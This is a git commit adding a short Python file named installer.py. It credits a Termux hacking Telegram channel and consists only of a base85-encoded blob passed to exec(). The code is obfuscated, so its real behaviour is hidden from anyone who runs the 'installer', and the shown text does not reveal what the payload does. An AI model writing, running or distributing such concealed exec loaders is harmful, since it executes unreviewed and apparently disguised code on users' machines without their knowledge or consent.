967b32a07c535147710d7c833a091e93375ebc09
elf <87319528+elf-cyber@users.noreply.github.com>
2022-01-08 15:35:15 +0330

    Add files via upload

---
+++ installer.py
@@ -0,0 +1,7 @@
+#Created By : Dr.Linux
+#Encoded By Py-Crypt
+#My Channel Telegram : @CHANNEL_TERMUX_HACK
+
+import base64
+
+exec(base64.b85decode(b'BOom*Eg)lWWNB_^Iv{m)W-T}%Eh;SvX>D+Ca&#bXa|&;BE@Nn9X>uqhFJxhKVJ~E1bYU-JZ*4AgWpZtGcrPzzX>4V4FKBOVWhW^LW@&6?AUz;&aAj^NCvtUeE^}xnAS@s!VJjyo3TA0+WiEGeX>?^MCvbUmXm4&HaA9+EcW-iJEp%maZFP7raA9+EcW-iJE^v7#DGFw3Y-KKEY;SXAC@Bhba(OxmARr(hW@&6?G9W!5Z*XO9C?_srVRLA5V<#XiASYobDGDGUARuOGY-KVocXDZTWhf_NVRL98a&>Mlb7&_i3T1d>WpH#l3LqdLAarthItm~lARr(hARupZE^~QvbY*QQCq5u9VqtS=a$_ec3LqdLAZ2)CWpH#l3LqdLARr(hAaG%Ga|$3JARuOGY-KVaJs@vzWo{@ZE@EMGXmVpGEFdRgCn*XbARr)SX>4UOE_ZTibY&<fVqtS=AaZqXE^}xnDGC'))
